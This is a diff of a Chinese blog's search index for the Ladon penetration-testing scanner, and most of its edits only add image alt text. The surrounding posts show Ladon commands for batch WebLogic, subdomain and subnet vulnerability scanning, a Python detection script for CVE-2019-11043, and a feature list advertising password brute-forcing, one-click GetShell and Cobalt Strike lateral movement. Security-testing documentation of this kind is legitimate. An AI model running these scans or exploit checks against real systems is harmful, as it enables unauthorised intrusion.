@@ -3667,7 +3667,7 @@ window.location.href="/Ladon/CVE-2022-36537.html";
 <h3 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h3><p>####（1）Ladon T3info模块探测 weblogic版本</p>
 <p>探测到版本代表开启T3协议 版本符合可尝试是否存在漏洞</p>
 <p>Ladon noping 192.168.188.2/24 T3info<br>Ladon 192.168.188.2:7001 T3info<br>Ladon <a href="http://192.168.188.2:7001" target="_blank" rel="noopener">http://192.168.188.2:7001</a>  T3info<br>Ladon url.txt T3info<br>Ladon noping ip.txt T3info<br>LadonGo对应模块为T3scan</p>
-<p><img alt data-original="https://mmbiz.qpic.cn/mmbiz_png/ESAML7BuCW6NOBN94RVlzvibkBgt3opm1hEeO8nGRxSNhLAibtnNajiaL4GiasFlEZnlSpI870ZI3jzackRic6gss1Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1"></p>
+<p><img alt="使用http访问查看图片" data-original="https://mmbiz.qpic.cn/mmbiz_png/ESAML7BuCW6NOBN94RVlzvibkBgt3opm1hEeO8nGRxSNhLAibtnNajiaL4GiasFlEZnlSpI870ZI3jzackRic6gss1Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1"></p>
 <p>相关搜索引擎导出url,然后批量检测T3协议</p>
 <p>Ladon url.txt T3info &gt; T3ver.txt</p>
 <p>当然也可以直接检测目标C段是否存在weblogic</p>
@@ -4736,13 +4736,13 @@ window.location.href="https://k8gege.org/Ladon/usblog.html";
     <title>〖EXP〗LadonGUI 8.6五种方法查询子域名</title>
     <url>/p/ctrshsubdomain.html</url>
     <content><![CDATA[<h3 id="LadonGUI-8-6查询子域名"><a href="#LadonGUI-8-6查询子域名" class="headerlink" title="LadonGUI 8.6查询子域名"></a>LadonGUI 8.6查询子域名</h3><p>1.主站友链提取子域名<br>2.IP138查询子域名<br>3.Zhaziyi查询子域名<br>4.Ctr.sh证书查询子域名<br>5.Brute爆破查询子域名</p>
-<p><img alt data-original="https://k8gege.github.io/k8img/Ladon/exe/GuiSubDomain.gif"></p>
+<p><img alt="使用http访问查看图片" data-original="https://k8gege.github.io/k8img/Ladon/exe/GuiSubDomain.gif"></p>
 <h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>LadonGui 8.1的SubDomain模块新增网页提取子域名、ctr.sh证书域名提取以及3万字典扫描探测子域名(去年的扫描功能也与2300星的工具对比明显Ladon速度很快且效率高，当然大家也可更换字典或增加字段的)</p>
 <p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/exe/Gui81_SubDomain.PNG"></p>
 <h3 id="CMD子域名扫描"><a href="#CMD子域名扫描" class="headerlink" title="CMD子域名扫描"></a>CMD子域名扫描</h3><p>Example: Ladon baidu.com SubDomain<br>需域名字典SubDomain.dic，字典上万个高效率子域名</p>
-<p><img alt data-original="https://k8gege.github.io/k8img/Ladon/exe/SubDomain.gif"><br><img alt data-original="https://k8gege.github.io/k8img/Ladon/cs/CS_SubDomain.gif"></p>
-<p>去年与2300星的Subbrute对比,明显Ladon速度快很多倍 <a href="https://github.com/TheRook/subbrute" target="_blank" rel="noopener">https://github.com/TheRook/subbrute</a><br>作者说它的工具携带字典包含2000个常用子域名<br>先运行Subbrute几秒钟后再运行Ladon,直止GIF图片结束<br>Ladon已扫出上百个子域名，而Subbrute才扫出几个<br><img alt data-original="https://k8gege.github.io/k8img/Other/subbrute_subdomain.gif"></p>
-<p>对比结束后，又单独使用Subbrute扫描，发现不稳定需多次运行才出结果且速度慢<br>相比之下速度太慢，程序又大，也不稳定，所以从以前至今都没用过subbrute<br>因为想学习一下别人的思路，发现有很多文章提到，又发现2300星，才下该工具测试<br>没有使用该工具爆破子域名的另外一个原因是K8飞刀早就有子域名爆破功能<br><img alt data-original="https://k8gege.github.io/k8img/Other/subbrute.gif"></p>
+<p><img alt="使用http访问查看图片" data-original="https://k8gege.github.io/k8img/Ladon/exe/SubDomain.gif"><br><img alt="使用http访问查看图片" data-original="https://k8gege.github.io/k8img/Ladon/cs/CS_SubDomain.gif"></p>
+<p>去年与2300星的Subbrute对比,明显Ladon速度快很多倍 <a href="https://github.com/TheRook/subbrute" target="_blank" rel="noopener">https://github.com/TheRook/subbrute</a><br>作者说它的工具携带字典包含2000个常用子域名<br>先运行Subbrute几秒钟后再运行Ladon,直止GIF图片结束<br>Ladon已扫出上百个子域名，而Subbrute才扫出几个<br><img alt="使用http访问查看图片" data-original="https://k8gege.github.io/k8img/Other/subbrute_subdomain.gif"></p>
+<p>对比结束后，又单独使用Subbrute扫描，发现不稳定需多次运行才出结果且速度慢<br>相比之下速度太慢，程序又大，也不稳定，所以从以前至今都没用过subbrute<br>因为想学习一下别人的思路，发现有很多文章提到，又发现2300星，才下该工具测试<br>没有使用该工具爆破子域名的另外一个原因是K8飞刀早就有子域名爆破功能<br><img alt="使用http访问查看图片" data-original="https://k8gege.github.io/k8img/Other/subbrute.gif"></p>
 <h3 id="Download"><a href="#Download" class="headerlink" title="Download"></a>Download</h3><h4 id="LadonGo-ALL-OS"><a href="#LadonGo-ALL-OS" class="headerlink" title="LadonGo (ALL OS)"></a>LadonGo (ALL OS)</h4><p><a href="https://github.com/k8gege/LadonGo/releases" target="_blank" rel="noopener">https://github.com/k8gege/LadonGo/releases</a></p>
 <h4 id="Ladon-Windows-amp-Cobalt-Strike"><a href="#Ladon-Windows-amp-Cobalt-Strike" class="headerlink" title="Ladon (Windows &amp; Cobalt Strike)"></a>Ladon (Windows &amp; Cobalt Strike)</h4><p>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a><br>7.0版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>8.6版本：K8小密圈</p>
 <div style="text-align: center; width: 710px; border: green solid 0px;">
@@ -6298,9 +6298,9 @@ window.location.href="https://k8gege.org/Ladon/SubDomain.html";
 <h3 id="GUI子域名扫描"><a href="#GUI子域名扫描" class="headerlink" title="GUI子域名扫描"></a>GUI子域名扫描</h3><p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/gui/SubDomain.PNG"></p>
 <h3 id="本地存活主机探测"><a href="#本地存活主机探测" class="headerlink" title="本地存活主机探测"></a>本地存活主机探测</h3><p><img alt="使用http访问查看图片" data-original="/k8img/Ladon/gui/OnlinePC.png"></p>
 <h3 id="CMD子域名扫描"><a href="#CMD子域名扫描" class="headerlink" title="CMD子域名扫描"></a>CMD子域名扫描</h3><p>Example: Ladon baidu.com SubDomain<br>需域名字典SubDomain.dic，字典上万个高效率子域名</p>
-<p><img alt data-original="https://k8gege.github.io/k8img/Ladon/exe/SubDomain.gif"><br><img alt data-original="https://k8gege.github.io/k8img/Ladon/cs/CS_SubDomain.gif"></p>
-<p>与2300星的Subbrute对比,明显Ladon速度快很多倍 <a href="https://github.com/TheRook/subbrute" target="_blank" rel="noopener">https://github.com/TheRook/subbrute</a><br>作者说它的工具携带字典包含2000个常用子域名<br>先运行Subbrute几秒钟后再运行Ladon,直止GIF图片结束<br>Ladon已扫出上百个子域名，而Subbrute才扫出几个<br><img alt data-original="https://k8gege.github.io/k8img/Other/subbrute_subdomain.gif"></p>
-<p>对比结束后，又单独使用Subbrute扫描，发现不稳定需多次运行才出结果且速度慢<br>相比之下速度太慢，程序又大，也不稳定，所以从以前至今都没用过subbrute<br>因为想学习一下别人的思路，发现有很多文章提到，又发现2300星，才下该工具测试<br>没有使用该工具爆破子域名的另外一个原因是K8飞刀早就有子域名爆破功能<br><img alt data-original="https://k8gege.github.io/k8img/Other/subbrute.gif"></p>
+<p><img alt="使用http访问查看图片" data-original="https://k8gege.github.io/k8img/Ladon/exe/SubDomain.gif"><br><img alt="使用http访问查看图片" data-original="https://k8gege.github.io/k8img/Ladon/cs/CS_SubDomain.gif"></p>
+<p>与2300星的Subbrute对比,明显Ladon速度快很多倍 <a href="https://github.com/TheRook/subbrute" target="_blank" rel="noopener">https://github.com/TheRook/subbrute</a><br>作者说它的工具携带字典包含2000个常用子域名<br>先运行Subbrute几秒钟后再运行Ladon,直止GIF图片结束<br>Ladon已扫出上百个子域名，而Subbrute才扫出几个<br><img alt="使用http访问查看图片" data-original="https://k8gege.github.io/k8img/Other/subbrute_subdomain.gif"></p>
+<p>对比结束后，又单独使用Subbrute扫描，发现不稳定需多次运行才出结果且速度慢<br>相比之下速度太慢，程序又大，也不稳定，所以从以前至今都没用过subbrute<br>因为想学习一下别人的思路，发现有很多文章提到，又发现2300星，才下该工具测试<br>没有使用该工具爆破子域名的另外一个原因是K8飞刀早就有子域名爆破功能<br><img alt="使用http访问查看图片" data-original="https://k8gege.github.io/k8img/Other/subbrute.gif"></p>
 <p>后期可能会添加证书或其它站点查询子域名(K8C段工具曾经添加过证书查询域名功能)</p>
 <h3 id="Ladon下载"><a href="#Ladon下载" class="headerlink" title="Ladon下载"></a>Ladon下载</h3><p>历史版本: <a href="http://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">http://github.com/k8gege/Ladon/releases</a><br>7.0版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>7.5版本：K8小密圈</p>
 <div style="text-align: center; width: 710px; border: green solid 0px;">
@@ -8065,12 +8065,12 @@ window.location.href="https://k8gege.org/Ladon/sshscan.html";
     <url>/p/28875.html</url>
     <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>使用Exp生成器生成Ladon插件实战,Weblogic CVE-2018-2894漏洞检测</p>
 <h3 id="漏洞扫描-Weblogic-CVE-2018-2894"><a href="#漏洞扫描-Weblogic-CVE-2018-2894" class="headerlink" title="漏洞扫描 Weblogic CVE-2018-2894"></a>漏洞扫描 Weblogic CVE-2018-2894</h3><p>github上有一份weblogic一键检测脚本，发现存在漏洞误报<br><br>看了下代码竟只是判断页面非404，对于返回403,500等误报<br><br>还不如写成200，虽然同样不靠谱，于是Ladon添加此POC检测<br></p>
-<h4 id="误报的POC检测脚本"><a href="#误报的POC检测脚本" class="headerlink" title="误报的POC检测脚本"></a>误报的POC检测脚本</h4><p><img alt data-original="https://k8gege.github.io/k8img/Ladon/exp/CVE-2018-2894_0.png"></p>
-<h4 id="存在漏洞的页面特征"><a href="#存在漏洞的页面特征" class="headerlink" title="存在漏洞的页面特征"></a>存在漏洞的页面特征</h4><p><img alt data-original="https://k8gege.github.io/k8img/Ladon/exp/CVE-2018-2894_1.png"></p>
+<h4 id="误报的POC检测脚本"><a href="#误报的POC检测脚本" class="headerlink" title="误报的POC检测脚本"></a>误报的POC检测脚本</h4><p><img alt="使用http访问查看图片" data-original="https://k8gege.github.io/k8img/Ladon/exp/CVE-2018-2894_0.png"></p>
+<h4 id="存在漏洞的页面特征"><a href="#存在漏洞的页面特征" class="headerlink" title="存在漏洞的页面特征"></a>存在漏洞的页面特征</h4><p><img alt="使用http访问查看图片" data-original="https://k8gege.github.io/k8img/Ladon/exp/CVE-2018-2894_1.png"></p>
 <h4 id="EXP生成器生成POC"><a href="#EXP生成器生成POC" class="headerlink" title="EXP生成器生成POC"></a>EXP生成器生成POC</h4><p>使用EXP生成器可简单检测，至少判断页面特征比单纯检测状态更好吧</p>
-<p><img alt data-original="https://k8gege.github.io/k8img/Ladon/exp/CVE-2018-2894_2.png"></p>
+<p><img alt="使用http访问查看图片" data-original="https://k8gege.github.io/k8img/Ladon/exp/CVE-2018-2894_2.png"></p>
 <h4 id="POC测试"><a href="#POC测试" class="headerlink" title="POC测试"></a>POC测试</h4><p>LadonExp生成的POC可单独使用，也可作为Ladon插件批量检测<br>单独使用: CVE-2018-2894_Poc.exe url<br><br>批量使用: Ladon CVE-2018-2894_Poc.exe (根目录url.txt)<br><br>当然Ladon内置模块WeblogicPoc已添加该漏洞检测<br></p>
-<p><img alt data-original="https://k8gege.github.io/k8img/Ladon/exp/CVE-2018-2894_3.png"></p>
+<p><img alt="使用http访问查看图片" data-original="https://k8gege.github.io/k8img/Ladon/exp/CVE-2018-2894_3.png"></p>
 ]]></content>
       <categories>
         <category>Exp</category>
@@ -8315,7 +8315,7 @@ window.location.href="https://k8gege.org/Ladon/sshscan.html";
 <h3 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h3><p>和Ladon.exe放在同一目录,即可对C段或url.txt进行批量检测</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Ladon CVE-2019-11043_Poc.ini 批量URL检测(根目录下放url.txt)</span><br><span class="line">Ladon 192.168.1.37/24 CVE-2019-11043_Poc.ini 批量检测C段主机是否存在该漏洞</span><br><span class="line">Ladon http://192.168.1.37:8080/index.php CVE-2019-11043_Poc.ini 指定URL</span><br><span class="line">Ladon 5.5</span><br><span class="line">By K8gege</span><br><span class="line">Call AnyExe/Command</span><br><span class="line">http://192.168.1.37:8080/index.php</span><br><span class="line">load F:\Python279\python.exe</span><br><span class="line">ISVUL: CVE-2019-11043 http://192.168.1.37:8080/index.php</span><br></pre></td></tr></table></figure>
 
-<p><img alt data-original="https://raw.githubusercontent.com/k8gege/CVE-2019-11043/master/CVE-2019-11043-POC.PNG"></p>
+<p><img alt="使用http访问查看图片" data-original="https://raw.githubusercontent.com/k8gege/CVE-2019-11043/master/CVE-2019-11043-POC.PNG"></p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment"># Ladon POC by k8gege</span></span><br><span class="line"><span class="comment"># VUL: CVE-2019-11043 (PHP-FPM + Ngnix)</span></span><br><span class="line"><span class="comment"># url need include .php Example：http://192.168.1.37:8080/index.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># CVE-2019-11043_POC.ini</span></span><br><span class="line"><span class="comment"># [Ladon]</span></span><br><span class="line"><span class="comment"># exe=F:\Python279\python.exe</span></span><br><span class="line"><span class="comment"># arg=POC\CVE-2019-11043-POC.py $ip$</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Example</span></span><br><span class="line"><span class="comment"># Ladon 192.168.1.37/24 poc/CVE-2019-11043_Poc.ini</span></span><br><span class="line"><span class="comment"># Ladon http://192.168.1.37:8080/index.php poc/CVE-2019-11043_Poc.ini</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Result</span></span><br><span class="line"><span class="comment"># Ladon 5.5</span></span><br><span class="line"><span class="comment"># Call AnyExe/Command</span></span><br><span class="line"><span class="comment"># http://192.168.1.37:8080/index.php</span></span><br><span class="line"><span class="comment"># load F:\Python279\python.exe</span></span><br><span class="line"><span class="comment"># ISVUL: CVE-2019-11043 http://192.168.1.37:8080/index.php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkpoc</span><span class="params">(url)</span>:</span></span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		headers = &#123;<span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0) Gecko/20100101 Firefox/6.0"</span>&#125;</span><br><span class="line">		res1 = requests.get(url, headers=headers)</span><br><span class="line">		<span class="keyword">if</span> res1.status_code == <span class="number">200</span>:</span><br><span class="line">			<span class="keyword">print</span> <span class="string">"URL: "</span>+url</span><br><span class="line">			<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1499</span>, <span class="number">1900</span>):</span><br><span class="line">				res = requests.get(url + <span class="string">"/PHP%0Ais_poc_thistiest_lang.php?"</span> + <span class="string">"K"</span> * i, headers=headers)</span><br><span class="line">				<span class="keyword">if</span> res.status_code == <span class="number">502</span>:</span><br><span class="line">					print(<span class="string">"ISVUL: CVE-2019-11043 "</span>+url)</span><br><span class="line">					<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">	  <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">url = sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">if</span> <span class="string">"http"</span> <span class="keyword">in</span> url:</span><br><span class="line">	checkpoc(url)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	checkpoc(<span class="string">"http://"</span>+url+<span class="string">"/index.php"</span>)</span><br><span class="line">	checkpoc(<span class="string">"http://"</span>+url+<span class="string">":8080/index.php"</span>)</span><br><span class="line">checkpoc(<span class="string">"https://"</span>+url+<span class="string">"/index.php"</span>)</span><br></pre></td></tr></table></figure>
 <h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>Poc: <a href="https://github.com/k8gege/CVE-2019-11043" target="_blank" rel="noopener">https://github.com/k8gege/CVE-2019-11043</a><br>Ladon: <a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener">https://github.com/k8gege/Ladon</a></p>
 ]]></content>
@@ -8868,7 +8868,7 @@ Microsoft Windows 10 for 32-bit Systems 0
   <entry>
     <title>Ladon Scanner For Python</title>
     <url>/p/dcb670e3.html</url>
-    <content><![CDATA[<h1 id="Ladon-Scanner-For-Python"><a href="#Ladon-Scanner-For-Python" class="headerlink" title="Ladon Scanner For Python"></a>Ladon Scanner For Python</h1><p><img alt data-original="https://k8gege.github.io/k8img/Ladon/Dragon.jpg"></p>
+    <content><![CDATA[<h1 id="Ladon-Scanner-For-Python"><a href="#Ladon-Scanner-For-Python" class="headerlink" title="Ladon Scanner For Python"></a>Ladon Scanner For Python</h1><p><img alt="使用http访问查看图片" data-original="https://k8gege.github.io/k8img/Ladon/Dragon.jpg"></p>
 <h3 id="PyLadon"><a href="#PyLadon" class="headerlink" title="PyLadon"></a>PyLadon</h3><p>目前python版功能较少,无论在Windows还是Linux系统性能以及速度均也比不上Ladon.exe<br><br>唯一的优点是跨平台,后续会添加相关功能，缺点也明显py打包程序很大，不太适合在目标使用<br><br><img data-original="https://k8gege.github.io/k8img/Ladon//py/PyLadon.PNG"></p>
 <h3 id="程序简介"><a href="#程序简介" class="headerlink" title="程序简介"></a>程序简介</h3><p>Ladon一款用于大型网络渗透的多线程插件化综合扫描神器，含端口扫描、服务识别、网络资产、密码爆破、高危漏洞检测以及一键GetShell，支持批量A段/B段/C段以及跨网段扫描，支持URL、主机、域名列表扫描。5.5版本内置39个功能模块,通过多种协议以及方法快速获取目标网络存活主机IP、计算机名、工作组、共享资源、网卡地址、操作系统版本、网站、子域名、中间件、开放服务、路由器、数据库等信息，漏洞检测包含MS17010、Weblogic、ActiveMQ、Tomcat、Struts2等，密码爆破11种含数据库(Mysql、Oracle、MSSQL)、FTP、SSH(Linux主机)、VNC、Windows密码(IPC、WMI、SMB)、Weblogic后台、Rar压缩包密码等，Web指纹识别模块可识别75种（Web应用、中间件、脚本类型、页面类型）等，可高度自定义插件POC支持.NET程序集、DLL(C#/Delphi/VC)、PowerShell等语言编写的插件,支持通过配置INI批量调用任意外部程序或命令，EXP生成器可一键生成漏洞POC快速扩展扫描能力。Ladon支持Cobalt Strike插件化扫描快速拓展内网进行横向移动。<br></p>
 <h3 id="使用说明"><a href="#使用说明" class="headerlink" title="使用说明"></a>使用说明</h3><table>
@@ -9572,8 +9572,8 @@ from pprint import pprint
         <category>内网渗透</category>
         <category>信息收集</category>
         <category>编程</category>
-        <category>嗅探</category>
         <category>Python</category>
+        <category>嗅探</category>
       </categories>
       <tags>
         <tag>Tool</tag>
